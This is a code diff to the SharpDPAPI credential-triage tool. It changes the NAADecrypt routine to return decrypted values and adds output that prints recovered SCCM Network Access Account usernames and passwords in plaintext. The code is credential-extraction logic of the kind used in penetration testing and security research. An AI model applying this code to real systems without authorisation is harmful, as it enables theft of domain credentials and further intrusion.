@@ -138,7 +138,7 @@ namespace SharpDPAPI.Commands
                                 }
                                 else
                                 {
-                                    Console.WriteLine("{0}: {1}", prop.Name, prop.Value);
+                                    //Console.WriteLine("{0}: {1}", prop.Name, prop.Value);
                                 }
                             }
                         }
@@ -152,7 +152,7 @@ namespace SharpDPAPI.Commands
             }
         }
 
-        public static void NAADecrypt(string blob, Dictionary<string, string> masterkeys)
+        public static string NAADecrypt(string blob, Dictionary<string, string> masterkeys)
         {
             byte[] blobBytes = new byte[blob.Length / 2];
             for (int i = 0; i < blob.Length; i += 2)
@@ -181,19 +181,31 @@ namespace SharpDPAPI.Commands
                             byte[] decBytes = new byte[finalIndex + 1];
                             Array.Copy(decBytesRaw, 0, decBytes, 0, finalIndex);
                             data = Encoding.Unicode.GetString(decBytes);
+                            return data;
                         }
                         else
                         {
                             data = Encoding.ASCII.GetString(decBytesRaw);
+                            return data;
                         }
+
                         Console.WriteLine("    dec(blob)        : {0}", data);
                     }
                     else
                     {
                         string hexData = BitConverter.ToString(decBytesRaw).Replace("-", " ");
                         Console.WriteLine("    dec(blob)        : {0}", hexData);
+                        return hexData;
                     }
                 }
+                else
+                {
+                    return null;
+                }
+            }
+            else
+            {
+                return null;
             }
         }
 
@@ -232,8 +244,15 @@ namespace SharpDPAPI.Commands
 
                             try
                             {
-                                NAADecrypt(protectedUsername, mappings);
-                                NAADecrypt(protectedPassword, mappings);
+                                string username = "";
+                                string password = "";
+
+                                Console.WriteLine("\r\n[*] Triaging SCCM Network Access Account Credentials\r\n");
+                                username = NAADecrypt(protectedUsername, mappings);
+                                password = NAADecrypt(protectedPassword, mappings);
+
+                                Console.WriteLine("    Plaintext NAA Username        : {0}", username);
+                                Console.WriteLine("    Plaintext NAA Password        : {0}", password);
                             }
                             catch (Exception e)
                             {
